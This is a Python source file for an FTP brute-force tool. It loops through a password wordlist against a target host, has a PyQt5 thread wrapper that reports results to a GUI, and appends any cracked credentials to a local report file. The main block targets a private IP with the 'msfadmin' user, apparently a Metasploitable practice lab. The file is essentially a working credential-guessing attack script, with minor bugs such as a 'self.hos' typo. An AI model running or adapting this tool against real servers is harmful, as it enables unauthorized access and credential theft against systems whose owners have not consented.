import ftplib
from threading import Thread
import subprocess as sp
from PyQt5 import QtCore
import time,subprocess as sp
import os
class ftp_brute():
    def __init__(self,host,user,port):
        try:
            from colors import colorfoll

            self.GREEN = colorfoll.TextColor.green
            self.RED = colorfoll.TextColor.red
            self.RESET = colorfoll.TextColor.reset
            self.BLUE = colorfoll.TextColor.blue
        except:
            self.GREEN = '\033[32m'
            self.RED = '\033[31m'
            self.RESET = '\033[0m'
            self.BLUE = '\033[34m'
        self.host = host
        self.user = user
        self.port = port

    def connect_ftp(self,password):

        if "nt" in os.name:
                dirk: str = str(sp.getoutput('powershell pwd'))
                dirk = dirk.replace(" ","").replace("\r","").replace("\n","").replace("'","").replace("Path","").replace("--","")
                if "\\brute\\protcal_brutfroce" not in dirk:
                    dirk  += "\\brute\\protcal_brutfroce"
                dirk = dirk.replace('\\brute\\protcal_brutfroce', '\\Reports\\brute-for\\')
        else:
                dirk: str = str(sp.getoutput('pwd'))
                if ("/brute/protcal_brutfroce" not in dirk):
                    dirk += "/brute/protcal_brutfroce"
                dirk = dirk.replace('/brute/protcal_brutfroce', '/Reports/brute-for/')
        server = ftplib.FTP()
        print("[!] Trying", password)
        try:
            server.connect(self.host, self.port, timeout=5)
            server.login(self.user, password)
            with open(dirk + self.host + "_ftp.json", "a") as dop:
                dop.write(f"{self.user}@{self.host}:{password}")
                dop.write("\n")
                dop.close()
            out = ""
            out += str("\tHost: " + self.host + "\n")
            out += str("\tUser: " + self.user + "\n")
            out += str("\tPassword: " + password + "\n")
            return out
        except ftplib.error_perm:
            pass

class GUI(QtCore.QThread):

        Gui_Date_output = QtCore.pyqtSignal(object)

        def __init__(self, host, user, passwords) -> None:
            QtCore.QThread.__init__(self)
            self.host = host
            self.user = user
            self.passwords = passwords
            print("[+] Passwords to try:", len(self.passwords))
            self.port = 21
            from colors import colorfoll
            self.GREEN = colorfoll.TextColor.green
            self.RED = colorfoll.TextColor.red
            self.RESET = colorfoll.TextColor.reset
            self.BLUE = colorfoll.TextColor.blue

        def run(self) -> None:
            if "nt" in os.name:
                dirk: str = str(sp.getoutput('powershell pwd'))
                dirk = dirk.replace(" ","").replace("\r","").replace("\n","").replace("'","").replace("Path","").replace("--","")
                if "\\brute\\protcal_brutfroce" not in dirk:
                    dirk  += "\\brute\\protcal_brutfroce"
                dirk = dirk.replace('\\brute\\protcal_brutfroce', '\\Reports\\brute-for\\')
            else:
                dirk: str = str(sp.getoutput('pwd'))
                if ("/brute/protcal_brutfroce" not in dirk):
                    dirk += "/brute/protcal_brutfroce"
                dirk = dirk.replace('/brute/protcal_brutfroce', '/Reports/brute-for/')
            ftp = ftp_brute(self.host, self.user, self.port)
            passwords =open(self.passwords).read().split("\n")

            try:
                for password in passwords:
                    ftb = ftp.connect_ftp(password)
                    if ftb != None:
                        self.Gui_Date_output.emit(str("[+] Found credentials: \n"))
                        self.Gui_Date_output.emit(str(ftb))
                        time.sleep(1)
                        QtCore.QCoreApplication.processEvents()
                        with open(dirk + self.hos + "_ftp.json", "a") as dop:
                            dop.write(str(ftb))
                            dop.write("\n")
                            dop.close()

                        break
            except:
                pass
if __name__ == "__main__":
    host = "192.168.82.128"
    user = "msfadmin"
    port = 21
    passwords = open("/home/shiky/PycharmProjects/scpt/brute/word_list.txt").read().split("\n")
    print("[+] Passwords to try:", len(passwords))
    ftp=ftp_brute(host,user,port)
    try:
        for password in passwords:
            ftb = ftp.connect_ftp(password)
            if ftb != None:
                print(f"{ftp.GREEN}[+] Found credentials: \n")
                print(f"{ftb} {ftp.RESET}")
                break
    except:
        pass
